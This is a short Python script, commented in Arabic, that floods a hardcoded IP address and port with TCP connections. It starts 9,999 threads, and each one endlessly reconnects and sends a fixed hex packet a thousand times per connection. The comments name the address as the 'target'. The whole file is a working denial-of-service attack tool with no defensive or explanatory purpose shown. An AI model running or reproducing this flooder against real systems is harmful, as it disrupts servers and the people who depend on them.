import socket
import threading
import time

# إعدادات الاتصال
ip = "5.223.46.86"  # عنوان IP الهدف
port = 10009  # المنفذ الهدف
num_connections = 9999  # عدد الاتصالات
num_send_per_connection = 1000  # عدد الحزم المرسلة لكل اتصال

# الحزمة التي سيتم إرسالها
packet = bytes.fromhex("F10400010900000001000000F1")

# دالة لتنفيذ الاتصال وإرسال الحزم بشكل مستمر
def send_packets(ip, port, packet, num_send_per_connection):
    while True:  # هذه الحلقة ستستمر إلى أن يتم قطع الاتصال
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ip, port))
                for i in range(num_send_per_connection):
                    s.sendall(packet)
                    print(f"Packet {i + 1} sent to {ip}:{port}")
            print(f"[+] Connection closed. Reconnecting...")
        except Exception as e:
            print(f"[-] Error: {e}. Retrying...")

# تنفيذ الاتصالات باستخدام Threads
threads = []
for _ in range(num_connections):
    thread = threading.Thread(target=send_packets, args=(ip, port, packet, num_send_per_connection))
    threads.append(thread)
    thread.start()

# الانتظار حتى تنتهي جميع الـ Threads
for thread in threads:
    thread.join()

print("Done sending packets.")
